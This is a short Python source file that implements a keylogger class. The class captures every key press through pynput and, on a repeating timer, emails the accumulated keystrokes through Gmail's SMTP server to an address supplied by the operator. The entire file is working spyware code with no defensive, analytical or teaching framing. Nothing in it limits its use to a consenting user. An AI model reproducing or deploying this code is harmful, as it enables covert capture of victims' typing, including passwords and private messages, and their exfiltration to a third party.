#!/usr/bin/env python

from pynput import keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval, username, password, email):
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.username = username
        self.password = password
        self.email = email

    def append_log(self, string):
        self.log = self.log + string

    # Send mail method
    def send_mail(self, username, password, email, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(username, password)
        server.sendmail(email, email, message)
        server.quit()

    # Process the key captured
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_log(current_key)

    # method to send the keystrokes to a specified email and start the threading
    def report(self):
        self.send_mail(self.username, self.password, self.email, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # Method to initialize and run the listener
    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.process_key_press)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()
